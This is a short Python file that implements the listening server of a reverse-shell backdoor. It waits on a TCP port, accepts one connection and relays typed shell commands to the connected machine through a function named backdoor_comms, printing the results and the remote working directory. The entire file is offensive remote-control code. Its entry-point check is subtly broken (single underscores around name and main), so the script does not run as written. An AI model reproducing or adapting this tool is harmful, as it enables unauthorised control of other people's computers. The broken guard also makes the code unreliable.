import socket

HOST = "127.0.0.1"
PORT = 9999
BUFFER = 1024
SEP = "<sep>"

def backdoor_comms(conn):
    cwd = conn.recv(BUFFER).decode()
    while True:
        command = input(f"[SHELL] {cwd}$> ")
        command = command.strip()  
        conn.send(command.encode())  

        output = conn.recv(BUFFER).decode()
        results, cwd = output.split(SEP)  
        print(results) 

def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_sock.bind((HOST, PORT))
    server_sock.listen(1)

    print("[SERVER] Waiting for connection...")
    conn, addr = server_sock.accept()
    print(f"[SERVER] New connection from {addr}")

    try:
        backdoor_comms(conn)
    except KeyboardInterrupt:
        print("\n[SERVER] Server interrupted. Closing connection...")
    finally:
        conn.close()
        server_sock.close()

if _name_ == "_main_":
    main()
